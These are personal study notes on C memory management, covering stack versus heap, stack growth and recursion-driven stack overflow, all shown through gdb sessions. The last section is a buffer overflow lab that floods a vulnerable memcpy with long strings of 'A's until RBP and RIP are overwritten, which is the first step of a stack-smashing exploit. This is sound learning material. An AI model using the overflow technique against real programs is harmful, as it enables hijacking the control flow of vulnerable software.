# Heap and Stack, Memory Management, in C

[Stack Data Structure (Introduction and Program)](http://www.geeksforgeeks.org/stack-data-structure-introduction-program/)

- `stack_arr.c`, C array implementation of stack; uses `malloc` so ironically, it's a "stack" on heap memory.  cf. [Stack Data Structure (Introduction and Program)](http://www.geeksforgeeks.org/stack-data-structure-introduction-program/)   
	* Pros; easy to implement, memory not saved as pointers; Cons; no dynamic, doesn't grow and shrink depending on runtime needs  
	* `gdb` note: `gdb ./stack_arr`, then 
```  
		(gdb) break main
		(gdb) run
		(gdb) next
		(gdb) bt # back trace, look at stack
		(gdb) next
		(gdb) bt
		...  

```  
	
You literally see each function call go to the stack, with each line of code, until `No stack`.  

```   
	(gdb) next  
	20 pushed to stack  
	73		push(stack, 30);  
	(gdb) bt  
	#0  main () at stack_arr.c:73  
	(gdb) next  
	30 pushed to stack  
	75		printf("%d popped from stack\n", pop(stack));  
	(gdb) bt  
	#0  main () at stack_arr.c:75  
	(gdb) next
	[Inferior 1 (process 7142) exited normally]
	(gdb) bt
	No stack.

``` 

These are other neat commands in `gdb` to directly observe how `malloc` assigns a memory block ("chunk of memory") to a `struct Stack`, `stack` and `struct` has contiguous (memory) addresses for its members (objects):  

```  
(gdb) p &stack
$2 = (struct Stack **) 0x7fffffffddf8 # 0x7fffffffddf8 is for, correct me if I'm wrong, gdb's own variable
(gdb) x &stack
0x7fffffffddf8:	0x00602010 # you want the right-hand side value, the actual (memory) address assigned to the memory block ("chunk of memory")  

(gdb) p stack->top
$3 = 1
(gdb) p &stack->top
$4 = (int *) 0x602010
(gdb) p &stack->capacity
$5 = (unsigned int *) 0x602014
(gdb) p &stack->array[0]
$6 = (int *) 0x602030
(gdb) p &stack->array
$7 = (int **) 0x602018
(gdb) p &stack->array[1]
$8 = (int *) 0x602034
(gdb) p &stack->array[2]
$9 = (int *) 0x602038
(gdb) p &stack->array[3]
$10 = (int *) 0x60203c
(gdb) p &stack->array[4]
$11 = (int *) 0x602040

(gdb) p stack->array[2]
$14 = 0
(gdb) p stack->array[1]
$15 = 20
(gdb) p stack->array[0]
$16 = 10
(gdb) x/s 0x602030
0x602030:	"\n"
(gdb) x/s 0x602034
0x602034:	"\024"
(gdb) x/i 0x602034
   0x602034:	adc    $0x0,%al
(gdb) x/x 0x602034
0x602034:	0x14
(gdb) x/d 0x602034
0x602034:	20
(gdb) x/d 0x602040
0x602040:	0
``` 
`x/i`, `x/s`, `x/d` let's you print out instruction-level format, `s` string format, or `d` decimal format, respectively, with `x`.  


- `stack_stack_arr.c` - `struct Stack stack` should be on stack memory, only: this is the result of `(gdb) info frame`:  

```  
(gdb) p &stack
$2 = (struct Stack *) 0x7fffffffdde0
...  
(gdb) x &stack
0x7fffffffdde0:	0xffffffff

(gdb) p &stack.n_top
$19 = (int *) 0x7fffffffdde0

(gdb) x &stack.n_top
   0x7fffffffdde0:	add    (%rax),%eax

(gdb) info frame
Stack level 0, frame at 0x7fffffffde10:
 rip = 0x400728 in main (stack_stack_arr.c:110); saved rip = 0x7ffff7a31431
 source language c.
 Arglist at 0x7fffffffde00, args: 
 Locals at 0x7fffffffde00, Previous frame's sp is 0x7fffffffde10
 Saved registers:
  rbp at 0x7fffffffde00, rip at 0x7fffffffde08

```  

Also, observe  
```  
(gdb) x stack.n_top
   0x3:	Cannot access memory at address 0x3
(gdb) x &stack.n_top
   0x7fffffffdde0:	add    (%rax),%eax
(gdb) p stack.n_top
$20 = 3
```  
It appears that possibly the integer value 3, it's part of the program/text memory of the program and it's in the "beginning" of the memory allocated to the program, the *text segment*.  
 
I also wanted to observe how the stack memory, used to store these local variables, including the `struct Stack`, and how stack "grows downward" from "high address" (large address to lower value address).  
```  
(gdb) run
Starting program: /home/topolo/PropD/HrdwCCppCUDA/Cmemory/heapstack/stack_stack_arr 

Breakpoint 3, main () at stack_stack_arr.c:91
91		struct Stack stack = createStack(10);
(gdb) p stack
$36 = {n_top = 4196144, N = 0, arr = 0x400400 <_start>}
(gdb) p &stack
$37 = (struct Stack *) 0x7fffffffdde0
(gdb) p &stack.arr
$38 = (int **) 0x7fffffffdde8
(gdb) p &stack.arr[1]
$39 = (int *) 0x400404 <_start+4>
(gdb) p &stack.arr[0]
$40 = (int *) 0x400400 <_start>
(gdb) p &stack.n_top
$41 = (int *) 0x7fffffffdde0
(gdb) x &stack.n_top
   0x7fffffffdde0:	xor    %al,(%rdi)
(gdb) p &stack.N
$42 = (unsigned int *) 0x7fffffffdde4
(gdb) x &stack.N
   0x7fffffffdde4:	add    %al,(%rax)
(gdb) next
92		struct Stack* ptr_stack = &stack;
(gdb) next

Breakpoint 1, main () at stack_stack_arr.c:101
101		push(ptr_stack, 1);
(gdb) next
1 pushed to stack
102		push(ptr_stack, 2);
(gdb) p stack
$43 = {n_top = 0, N = 10, arr = 0x7fffffffdd70}
(gdb) p &stack.n_top
$44 = (int *) 0x7fffffffdde0
(gdb) p &stack.arr[0]
$45 = (int *) 0x7fffffffdd70
(gdb) p &stack.arr[1]
$46 = (int *) 0x7fffffffdd74
```  

Observe directly the size (pun intended) of *text*, *data* (initialized data segment), and *bss* (uninitialized data segment) with `size`:  

```  
size ./stack_stack_arr
   text	   data	    bss	    dec	    hex	filename
   1943	    540	      4	   2487	    9b7	./stack_stack_arr
```  

with `dec` being the sum of *text,data,bss*, i.e. *dec = text + data + bss*.  I'm assuming *hex* is the same, but in hexidecimal form (2487 = 9b7 = 9*16^2 + 11*16 + 7).  

cf. [Memory Layout of C Programs, GeeksforGeeks](http://www.geeksforgeeks.org/memory-layout-of-c-program/) introduced `size` GNU command for memory layout size; [text, data, and bss: Code and Data Size Explained](https://mcuoneclipse.com/2013/04/14/text-data-and-bss-code-and-data-size-explained/) for breakdown of `size` categories `text`, `data`, `bss` (`bss` is uninitialized data, abbreviation for "Block Started by Symbol".   

## Stack Overflow examples  

- `main_on_main.c` :  
``` 
int main() {
	main();
}  
```  
The result of running/execution is  
```  
./main_on_main 
Segmentation fault (core dumped)
```  
The problem is the recursion which fills up the stack with its function calls.  This can be explicitly shown with `gdb`:  
```  
(gdb) run
Starting program: /home/topolo/PropD/HrdwCCppCUDA/Cmemory/heapstack/main_on_main 

Program received signal SIGSEGV, Segmentation fault.
0x00000000004004af in main () at main_on_main.c:12
12		main();
(gdb) bt
#0  0x00000000004004af in main () at main_on_main.c:12
(gdb) print &main
$1 = (int (*)()) 0x4004a6 <main>
(gdb) x &main
0x4004a6 <main>:	0xe5894855  
...
(gdb) break
Breakpoint 1 at 0x4004af: file main_on_main.c, line 12.

(gdb) next

Breakpoint 1, 0x00000000004004af in main () at main_on_main.c:12
12		main();
(gdb) bt
#0  0x00000000004004af in main () at main_on_main.c:12
(gdb) next

Breakpoint 1, 0x00000000004004af in main () at main_on_main.c:12
12		main();
(gdb) bt
#0  0x00000000004004af in main () at main_on_main.c:12
(gdb) next

Breakpoint 1, 0x00000000004004af in main () at main_on_main.c:12
12		main();
(gdb) bt
#0  0x00000000004004af in main () at main_on_main.c:12
```  

Remember to look at the stack directly with `info frame`:  

```  
(gdb) info frame
Stack level 0, frame at 0x7fffffffdd80:
 rip = 0x4004af in main (main_on_main.c:12); saved rip = 0x4004b4
 source language c.
 Arglist at 0x7fffffffdd70, args: 
 Locals at 0x7fffffffdd70, Previous frame's sp is 0x7fffffffdd80
 Saved registers:
  rbp at 0x7fffffffdd70, rip at 0x7fffffffdd78
(gdb) next

Breakpoint 1, 0x00000000004004af in main () at main_on_main.c:12
12		main();
(gdb) info frame
Stack level 0, frame at 0x7fffffffdd70:
 rip = 0x4004af in main (main_on_main.c:12); saved rip = 0x4004b4
 source language c.
 Arglist at 0x7fffffffdd60, args: 
 Locals at 0x7fffffffdd60, Previous frame's sp is 0x7fffffffdd70
 Saved registers:
  rbp at 0x7fffffffdd60, rip at 0x7fffffffdd68
(gdb) next

Breakpoint 1, 0x00000000004004af in main () at main_on_main.c:12
12		main();
(gdb) info frame
Stack level 0, frame at 0x7fffffffdd60:
 rip = 0x4004af in main (main_on_main.c:12); saved rip = 0x4004b4
 source language c.
 Arglist at 0x7fffffffdd50, args: 
 Locals at 0x7fffffffdd50, Previous frame's sp is 0x7fffffffdd60
 Saved registers:
  rbp at 0x7fffffffdd50, rip at 0x7fffffffdd58
```  
We see *directly* how the stack is "growing downward", saving to registers of decreasing addresses! (**!!!**)
  
- `infiniterecursion.c`  

Same thing with infinite recursion, either no base case, or calling itself over and over.  

The `gdb` strategy is this: 
- `(gdb) run`, see signal `SIGSEGV` Segmentation Fault (who exactly knows the stack is overflow?  It happens at *runtime.* I'm guessing compiler is done with its job, compiling the machine instructions already.  Address bus assigned the addresses to a chunk of memory (memory block).  Then OS must be responsible for throwing back that stack segment is full.),  
- seeing signal `SIGSEGV`, `(gdb) break`.   
- `(gdb) run` again.  Then step through, observing the stack *directly* with `next`, `info frame`, `next`, `info frame`, ...  

```  
(gdb) run
Starting program: /home/topolo/PropD/HrdwCCppCUDA/Cmemory/heapstack/infiniterecursion 

Program received signal SIGSEGV, Segmentation fault.
0x00000000004004ae in add (
    n=<error reading variable: Cannot access memory at address 0x7fffff7feffc>)
    at infiniterecursion.c:12
12	{
(gdb) break
Breakpoint 1 at 0x4004ae: file infiniterecursion.c, line 12.
(gdb) next

Program terminated with signal SIGSEGV, Segmentation fault.
The program no longer exists.
(gdb) run
Starting program: /home/topolo/PropD/HrdwCCppCUDA/Cmemory/heapstack/infiniterecursion 

Breakpoint 1, 0x00000000004004ae in add (n=0) at infiniterecursion.c:12
12	{
(gdb) info frame
Stack level 0, frame at 0x7fffffffddf0:
 rip = 0x4004ae in add (infiniterecursion.c:12); saved rip = 0x4004d5
 called by frame at 0x7fffffffde00
 source language c.
 Arglist at 0x7fffffffdde0, args: n=0
 Locals at 0x7fffffffdde0, Previous frame's sp is 0x7fffffffddf0
 Saved registers:
  rbp at 0x7fffffffdde0, rip at 0x7fffffffdde8
(gdb) next
13		return n + add(n+1);
(gdb) info frame
Stack level 0, frame at 0x7fffffffddf0:
 rip = 0x4004b1 in add (infiniterecursion.c:13); saved rip = 0x4004d5
 called by frame at 0x7fffffffde00
 source language c.
 Arglist at 0x7fffffffdde0, args: n=2
 Locals at 0x7fffffffdde0, Previous frame's sp is 0x7fffffffddf0
 Saved registers:
  rbp at 0x7fffffffdde0, rip at 0x7fffffffdde8
(gdb) next

Breakpoint 1, 0x00000000004004ae in add (n=0) at infiniterecursion.c:12
12	{
(gdb) info frame
Stack level 0, frame at 0x7fffffffddd0:
 rip = 0x4004ae in add (infiniterecursion.c:12); saved rip = 0x4004be
 called by frame at 0x7fffffffddf0
 source language c.
 Arglist at 0x7fffffffddc0, args: n=0
 Locals at 0x7fffffffddc0, Previous frame's sp is 0x7fffffffddd0
 Saved registers:
  rbp at 0x7fffffffddc0, rip at 0x7fffffffddc8
(gdb) next
13		return n + add(n+1);
(gdb) info frame
Stack level 0, frame at 0x7fffffffddd0:
 rip = 0x4004b1 in add (infiniterecursion.c:13); saved rip = 0x4004be
 called by frame at 0x7fffffffddf0
 source language c.
 Arglist at 0x7fffffffddc0, args: n=3
 Locals at 0x7fffffffddc0, Previous frame's sp is 0x7fffffffddd0
 Saved registers:
  rbp at 0x7fffffffddc0, rip at 0x7fffffffddc8
(gdb) next

Breakpoint 1, 0x00000000004004ae in add (n=32767) at infiniterecursion.c:12
12	{
(gdb) info frame
Stack level 0, frame at 0x7fffffffddb0:
 rip = 0x4004ae in add (infiniterecursion.c:12); saved rip = 0x4004be
 called by frame at 0x7fffffffddd0
 source language c.
 Arglist at 0x7fffffffdda0, args: n=32767
 Locals at 0x7fffffffdda0, Previous frame's sp is 0x7fffffffddb0
 Saved registers:
  rbp at 0x7fffffffdda0, rip at 0x7fffffffdda8
(gdb) next
13		return n + add(n+1);
(gdb) info frame
Stack level 0, frame at 0x7fffffffddb0:
 rip = 0x4004b1 in add (infiniterecursion.c:13); saved rip = 0x4004be
 called by frame at 0x7fffffffddd0
 source language c.
 Arglist at 0x7fffffffdda0, args: n=4
 Locals at 0x7fffffffdda0, Previous frame's sp is 0x7fffffffddb0
 Saved registers:
  rbp at 0x7fffffffdda0, rip at 0x7fffffffdda8
(gdb) next

Breakpoint 1, 0x00000000004004ae in add (n=0) at infiniterecursion.c:12
12	{
(gdb) info frame
Stack level 0, frame at 0x7fffffffdd90:
 rip = 0x4004ae in add (infiniterecursion.c:12); saved rip = 0x4004be
 called by frame at 0x7fffffffddb0
 source language c.
 Arglist at 0x7fffffffdd80, args: n=0
 Locals at 0x7fffffffdd80, Previous frame's sp is 0x7fffffffdd90
 Saved registers:
  rbp at 0x7fffffffdd80, rip at 0x7fffffffdd88
(gdb) next
13		return n + add(n+1);
(gdb) next

Breakpoint 1, 0x00000000004004ae in add (n=0) at infiniterecursion.c:12
12	{
(gdb) info frame
Stack level 0, frame at 0x7fffffffdd70:
 rip = 0x4004ae in add (infiniterecursion.c:12); saved rip = 0x4004be
 called by frame at 0x7fffffffdd90
 source language c.
 Arglist at 0x7fffffffdd60, args: n=0
 Locals at 0x7fffffffdd60, Previous frame's sp is 0x7fffffffdd70
 Saved registers:
  rbp at 0x7fffffffdd60, rip at 0x7fffffffdd68
```  

We see that those function calls, with *decreasing addresses* in that stack segment region, are saved registers and taking up all of the stack (eventually!).  

- `chararr_bufferover.c`  

- `chararr_main_bufferover.c`  

cf. [Stack based buffer overflow Exploitation Tutorial By Saif El Sherei](https://www.exploit-db.com/docs/28475.pdf)

Take a look at the 3 lines, involving registers **rbp, rsp**  
```  
(gdb) disassemble main
Dump of assembler code for function main:

   0x00000000004005a6 <+0>:	push   %rbp
   0x00000000004005a7 <+1>:	mov    %rsp,%rbp
   0x00000000004005aa <+4>:	sub    $0x110,%rsp

   0x00000000004005b1 <+11>:	mov    %edi,-0x104(%rbp)
   0x00000000004005b7 <+17>:	mov    %rsi,-0x110(%rbp)
   0x00000000004005be <+24>:	mov    -0x110(%rbp),%rax
   0x00000000004005c5 <+31>:	add    $0x8,%rax
   0x00000000004005c9 <+35>:	mov    (%rax),%rax
   0x00000000004005cc <+38>:	mov    %rax,%rdi
   0x00000000004005cf <+41>:	callq  0x400480 <strlen@plt>
   0x00000000004005d4 <+46>:	mov    %rax,%rdx
   0x00000000004005d7 <+49>:	mov    -0x110(%rbp),%rax
   0x00000000004005de <+56>:	add    $0x8,%rax
   0x00000000004005e2 <+60>:	mov    (%rax),%rcx
   0x00000000004005e5 <+63>:	lea    -0x100(%rbp),%rax
   0x00000000004005ec <+70>:	mov    %rcx,%rsi
   0x00000000004005ef <+73>:	mov    %rax,%rdi
   0x00000000004005f2 <+76>:	callq  0x4004a0 <memcpy@plt>
   0x00000000004005f7 <+81>:	lea    -0x100(%rbp),%rax
   0x00000000004005fe <+88>:	mov    %rax,%rdi
   0x0000000000400601 <+91>:	mov    $0x0,%eax
   0x0000000000400606 <+96>:	callq  0x400490 <printf@plt>
   0x000000000040060b <+101>:	mov    $0x0,%eax
   0x0000000000400610 <+106>:	leaveq 
   0x0000000000400611 <+107>:	retq   
End of assembler dump.
```  

[**push**](https://stackoverflow.com/questions/4584089/what-is-the-function-of-the-push-pop-instructions-used-on-registers-in-x86-ass) means writing it to the stack.  
`push %rbp` is to write or push this value to the stack.  

I will use the mathematical function eval as shorthand notation for getting the value there, i.e. eval: Memory -> ZZ (i.e. ZZ \equiv \mathbb{ZZ})

[`mov`](http://flint.cs.yale.edu/cs421/papers/x86-asm/asm.html) moves data between registers and memory; the syntax is 1st. the source, and 2nd., the destination.    
`mov %rsp,$rbp` - `%rsp` -> `%rbp` or `%rbp` = eval(`%rsp`). Load 4 bytes from memory address RSP into RBP.  

[`sub` - Integer subtraction](http://www.cs.virginia.edu/~evans/cs216/guides/x86.html) -  The `sub` instruction stores in the value of its first operand the result of subtracting the value of its second operand from the value of its first operand. As with `add`.    
`sub $0x110,%rsp` i.e. eval(`$0x110`) = eval(`$0x110`) - eval(`%rsp`)   

RBP becomes the new stack frame ptr.  RSP had its contents moved into RBP.  

[`callq`](http://felixcloutier.com/x86/CALL.html) - it's just call, and `call` procedures "Saves procedure linking information on the stack and branches to the called procedure specified using the target operand. "  
`q` operand-size suffix does technically apply (pushes, writes, 64-bit return address).  cf. [assembly - What is callq instruction? - Stack Overflow](https://stackoverflow.com/questions/46752964/what-is-callq-instruction)

[`retq`](http://flint.cs.yale.edu/cs421/papers/x86-asm/asm.html) - 1st, pops code location off hardware supported in-memory stack (see `pop`), then performs unconditional jump to retrieved code location.  cf. [`retq` where](https://stackoverflow.com/questions/18311242/retq-instruction-where-does-it-return)


Put break points at function call, `callq`, `memcpy` and `retq` instruction; 

```  
(gdb) break *main+76
Breakpoint 1 at 0x4005f2: file chararr_main_bufferover.c, line 36.
(gdb) break *main+106
Breakpoint 2 at 0x400610: file chararr_main_bufferover.c, line 38.
```    

Run the program, `run $(python -c 'print "A"*265')` (also you can use `gdb` shortcut to `run`, `r`),  
and look at registers of 1st break point: `i r`  (also look at `info frame`).    

```  
(gdb) run $(python -c 'print "A"*265')
Starting program: /home/topolo/PropD/HrdwCCppCUDA/Cmemory/heapstack/chararr_main_bufferover $(python -c 'print "A"*265')

Breakpoint 1, 0x00000000004005f2 in main (argc=2, argv=0x7fffffffddb8)
    at chararr_main_bufferover.c:36
36		 memcpy(buf, argv[1], strlen(argv[1]));
(gdb) i r
rax            0x7fffffffdbd0	140737488346064
rbx            0x0	0
rcx            0x7fffffffe130	140737488347440
rdx            0x109	265
rsi            0x7fffffffe130	140737488347440
rdi            0x7fffffffdbd0	140737488346064
rbp            0x7fffffffdcd0	0x7fffffffdcd0
rsp            0x7fffffffdbc0	0x7fffffffdbc0
r8             0x0	0
r9             0x7ffff7de81b0	140737351942576
r10            0x30b	779
r11            0x7ffff7a9df90	140737348493200
r12            0x4004b0	4195504
r13            0x7fffffffddb0	140737488346544
r14            0x0	0
r15            0x0	0
rip            0x4005f2	0x4005f2 <main+76>
eflags         0x216	[ PF AF IF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0
gs             0x0	0
(gdb) info frame
Stack level 0, frame at 0x7fffffffdce0:
 rip = 0x4005f2 in main (chararr_main_bufferover.c:36); saved rip = 0x7ffff7a31431
 source language c.
 Arglist at 0x7fffffffdcd0, args: argc=2, argv=0x7fffffffddb8
 Locals at 0x7fffffffdcd0, Previous frame's sp is 0x7fffffffdce0
 Saved registers:
  rbp at 0x7fffffffdcd0, rip at 0x7fffffffdcd8

```  
Continue (with `(gdb) c`) to 2nd. break pt right before `ret`, and step 1 more with `(gdb) s`:  
```  
(gdb) c
Continuing.

Breakpoint 2, main (argc=2, argv=0x7fffffffddb8) at chararr_main_bufferover.c:38
38	}
(gdb) s

Program received signal SIGSEGV, Segmentation fault.
0x00007ffff7a31453 in __libc_start_main (main=0x4005a6 <main>, argc=2, 
    argv=0x7fffffffddb8, init=<optimized out>, fini=<optimized out>, 
    rtld_fini=<optimized out>, stack_end=0x7fffffffdda8) at ../csu/libc-start.c:295
295	      PTHFCT_CALL (ptr__nptl_deallocate_tsd, ());

(gdb) i r
rax            0xfc196b08d75a7e09	-281075816017002999
rbx            0x0	0
rcx            0xfbad2a84	4222429828
rdx            0x7ffff7dd3740	140737351857984
rsi            0x602010	6299664
rdi            0x60211e	6299934
rbp            0x4141414141414141	0x4141414141414141
rsp            0x7fffffffdce0	0x7fffffffdce0
r8             0x602000	6299648
r9             0x10e	270
r10            0x602010	6299664
r11            0x246	582
r12            0x4004b0	4195504
r13            0x7fffffffddb0	140737488346544
r14            0x0	0
r15            0x0	0
rip            0x7ffff7a31453	0x7ffff7a31453 <__libc_start_main+275>
eflags         0x10286	[ PF SF IF RF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0
gs             0x0	0
(gdb) info frame
Stack level 0, frame at 0x7fffffffdda0:
 rip = 0x7ffff7a31453 in __libc_start_main (../csu/libc-start.c:295); saved rip = 0x4004da
 called by frame at 0x0
 source language c.
 Arglist at 0x7fffffffdcd8, args: main=0x4005a6 <main>, argc=2, argv=0x7fffffffddb8, 
    init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, 
    stack_end=0x7fffffffdda8
 Locals at 0x7fffffffdcd8, Previous frame's sp is 0x7fffffffdda0
 Saved registers:
  rbx at 0x7fffffffdd70, rbp at 0x7fffffffdd78, r12 at 0x7fffffffdd80,
  r13 at 0x7fffffffdd88, r14 at 0x7fffffffdd90, rip at 0x7fffffffdd98

``` 
Focus on looking at registers RBP and RIP.  

*Base (control) case* - no segmentation fault, normal operation copying string of length < 256.  

Do the same, but have a string of A's of length < 256.  

```  
(gdb) break *main+76
Breakpoint 1 at 0x4005f2: file chararr_main_bufferover.c, line 36.
(gdb) break *main+106
Breakpoint 2 at 0x400610: file chararr_main_bufferover.c, line 38.
(gdb) r $(python -c 'print "A"*255')
Starting program: /home/topolo/PropD/HrdwCCppCUDA/Cmemory/heapstack/chararr_main_bufferover $(python -c 'print "A"*255')

Breakpoint 1, 0x00000000004005f2 in main (argc=2, argv=0x7fffffffddc8)
    at chararr_main_bufferover.c:36
36		 memcpy(buf, argv[1], strlen(argv[1]));
(gdb) i r
rax            0x7fffffffdbe0	140737488346080
rbx            0x0	0
rcx            0x7fffffffe13a	140737488347450
rdx            0xff	255
rsi            0x7fffffffe13a	140737488347450
rdi            0x7fffffffdbe0	140737488346080
rbp            0x7fffffffdce0	0x7fffffffdce0
rsp            0x7fffffffdbd0	0x7fffffffdbd0
r8             0x0	0
r9             0x7ffff7de81b0	140737351942576
r10            0x30b	779
r11            0x7ffff7a9df90	140737348493200
r12            0x4004b0	4195504
r13            0x7fffffffddc0	140737488346560
r14            0x0	0
r15            0x0	0
rip            0x4005f2	0x4005f2 <main+76>
eflags         0x212	[ AF IF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0
gs             0x0	0
(gdb) info frame
Stack level 0, frame at 0x7fffffffdcf0:
 rip = 0x4005f2 in main (chararr_main_bufferover.c:36); saved rip = 0x7ffff7a31431
 source language c.
 Arglist at 0x7fffffffdce0, args: argc=2, argv=0x7fffffffddc8
 Locals at 0x7fffffffdce0, Previous frame's sp is 0x7fffffffdcf0
 Saved registers:
  rbp at 0x7fffffffdce0, rip at 0x7fffffffdce8
(gdb) c
Continuing.

Breakpoint 2, main (argc=2, argv=0x7fffffffddc8) at chararr_main_bufferover.c:38
38	}
(gdb) s
__libc_start_main (main=0x4005a6 <main>, argc=2, argv=0x7fffffffddc8, 
    init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, 
    stack_end=0x7fffffffddb8) at ../csu/libc-start.c:323
323	  exit (result);
(gdb) i r
rax            0x0	0
rbx            0x0	0
rcx            0xfbad2a84	4222429828
rdx            0x7ffff7dd3740	140737351857984
rsi            0x602010	6299664
rdi            0x60210f	6299919
rbp            0x400620	0x400620 <__libc_csu_init>
rsp            0x7fffffffdcf0	0x7fffffffdcf0
r8             0x602000	6299648
r9             0xff	255
r10            0x602010	6299664
r11            0x246	582
r12            0x4004b0	4195504
r13            0x7fffffffddc0	140737488346560
r14            0x0	0
r15            0x0	0
rip            0x7ffff7a31431	0x7ffff7a31431 <__libc_start_main+241>
eflags         0x202	[ IF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0
gs             0x0	0
(gdb) info frame
Stack level 0, frame at 0x7fffffffddb0:
 rip = 0x7ffff7a31431 in __libc_start_main (../csu/libc-start.c:323); saved rip = 0x4004da
 called by frame at 0x0
 source language c.
 Arglist at 0x7fffffffdce8, args: main=0x4005a6 <main>, argc=2, argv=0x7fffffffddc8, 
    init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, 
    stack_end=0x7fffffffddb8
 Locals at 0x7fffffffdce8, Previous frame's sp is 0x7fffffffddb0
 Saved registers:
  rbx at 0x7fffffffdd80, rbp at 0x7fffffffdd88, r12 at 0x7fffffffdd90,
  r13 at 0x7fffffffdd98, r14 at 0x7fffffffdda0, rip at 0x7fffffffdda8
```  

Focus on looking at *RBP*, *RIP* registers.  This is the base case.  

* Case of overwriting with many 'A's:  

```    
(gdb) run $(python -c 'print "A"*266')
Starting program: /home/topolo/PropD/HrdwCCppCUDA/Cmemory/heapstack/chararr_main_bufferover $(python -c 'print "A"*266')

Breakpoint 1, 0x00000000004005f2 in main (argc=2, argv=0x7fffffffddb8)
    at chararr_main_bufferover.c:36
36		 memcpy(buf, argv[1], strlen(argv[1]));
(gdb) i r
rax            0x7fffffffdbd0	140737488346064
rbx            0x0	0
rcx            0x7fffffffe12f	140737488347439
rdx            0x10a	266
rsi            0x7fffffffe12f	140737488347439
rdi            0x7fffffffdbd0	140737488346064
rbp            0x7fffffffdcd0	0x7fffffffdcd0
rsp            0x7fffffffdbc0	0x7fffffffdbc0
r8             0x0	0
r9             0x7ffff7de81b0	140737351942576
r10            0x30b	779
r11            0x7ffff7a9df90	140737348493200
r12            0x4004b0	4195504
r13            0x7fffffffddb0	140737488346544
r14            0x0	0
r15            0x0	0
rip            0x4005f2	0x4005f2 <main+76>
eflags         0x216	[ PF AF IF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0
gs             0x0	0
(gdb) info frame
Stack level 0, frame at 0x7fffffffdce0:
 rip = 0x4005f2 in main (chararr_main_bufferover.c:36); saved rip = 0x7ffff7a31431
 source language c.
 Arglist at 0x7fffffffdcd0, args: argc=2, argv=0x7fffffffddb8
 Locals at 0x7fffffffdcd0, Previous frame's sp is 0x7fffffffdce0
 Saved registers:
  rbp at 0x7fffffffdcd0, rip at 0x7fffffffdcd8
(gdb) c
Continuing.

Breakpoint 2, main (argc=2, argv=0x7fffffffddb8) at chararr_main_bufferover.c:38
38	}
(gdb) s

Program received signal SIGBUS, Bus error.
0x00007ffff7a34141 in __gconv_read_conf () at gconv_conf.c:598
598	      const char *to = __rawmemchr (from, '\0') + 1;
(gdb) i r
rax            0x0	0
rbx            0x0	0
rcx            0xfbad2a84	4222429828
rdx            0x7ffff7dd3740	140737351857984
rsi            0x602010	6299664
rdi            0x60211e	6299934
rbp            0x4141414141414141	0x4141414141414141
rsp            0x7fffffffdce0	0x7fffffffdce0
r8             0x602000	6299648
r9             0x10e	270
r10            0x602010	6299664
r11            0x246	582
r12            0x4004b0	4195504
r13            0x7fffffffddb0	140737488346544
r14            0x0	0
r15            0x0	0
rip            0x7ffff7a34141	0x7ffff7a34141 <__gconv_read_conf+593>
eflags         0x10206	[ PF IF RF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0
gs             0x0	0
(gdb) info frame
Stack level 0, frame at 0x4141414141414151:
 rip = 0x7ffff7a34141 in __gconv_read_conf (gconv_conf.c:598); saved rip = <not saved>
 Outermost frame: Cannot access memory at address 0x4141414141414149
 source language c.
 Arglist at 0x4141414141414141, args: 
 Locals at 0x4141414141414141, Previous frame's sp is 0x4141414141414151
Cannot access memory at address 0x4141414141414119
```  

We can compare the registers, RDX, RBP, RIP with the previous cases and start seeing how one has to look at the *instruction level* to see that the instructions are taking the "overflowed" `char`'s and writing with them.  

```  
(gdb) r $(python -c 'print "A"*270')
Starting program: /home/topolo/PropD/HrdwCCppCUDA/Cmemory/heapstack/chararr_main_bufferover $(python -c 'print "A"*270')

Breakpoint 1, 0x00000000004005f2 in main (argc=2, argv=0x7fffffffddb8)
    at chararr_main_bufferover.c:36
36		 memcpy(buf, argv[1], strlen(argv[1]));
(gdb) i r
rax            0x7fffffffdbd0	140737488346064
rbx            0x0	0
rcx            0x7fffffffe12b	140737488347435
rdx            0x10e	270
rsi            0x7fffffffe12b	140737488347435
rdi            0x7fffffffdbd0	140737488346064
rbp            0x7fffffffdcd0	0x7fffffffdcd0
rsp            0x7fffffffdbc0	0x7fffffffdbc0
r8             0x0	0
r9             0x7ffff7de81b0	140737351942576
r10            0x30b	779
r11            0x7ffff7a9df90	140737348493200
r12            0x4004b0	4195504
r13            0x7fffffffddb0	140737488346544
r14            0x0	0
r15            0x0	0
rip            0x4005f2	0x4005f2 <main+76>
eflags         0x216	[ PF AF IF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0
gs             0x0	0
(gdb) info frame
Stack level 0, frame at 0x7fffffffdce0:
 rip = 0x4005f2 in main (chararr_main_bufferover.c:36); saved rip = 0x7ffff7a31431
 source language c.
 Arglist at 0x7fffffffdcd0, args: argc=2, argv=0x7fffffffddb8
 Locals at 0x7fffffffdcd0, Previous frame's sp is 0x7fffffffdce0
 Saved registers:
  rbp at 0x7fffffffdcd0, rip at 0x7fffffffdcd8
(gdb) c
Continuing.

Breakpoint 2, main (argc=2, argv=0x7fffffffddb8) at chararr_main_bufferover.c:38
38	}
(gdb) s
Warning:
Cannot insert breakpoint 0.
Cannot access memory at address 0x40000

0x0000414141414141 in ?? ()
(gdb) i r
rax            0x0	0
rbx            0x0	0
rcx            0xfbad2a84	4222429828
rdx            0x7ffff7dd3740	140737351857984
rsi            0x602010	6299664
rdi            0x60211e	6299934
rbp            0x4141414141414141	0x4141414141414141
rsp            0x7fffffffdce0	0x7fffffffdce0
r8             0x602000	6299648
r9             0x10e	270
r10            0x602010	6299664
r11            0x246	582
r12            0x4004b0	4195504
r13            0x7fffffffddb0	140737488346544
r14            0x0	0
r15            0x0	0
rip            0x414141414141	0x414141414141
eflags         0x206	[ PF IF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0
gs             0x0	0
(gdb) info frame
Stack level 0, frame at 0x7fffffffdce8:
 rip = 0x414141414141; saved rip = 0x40000
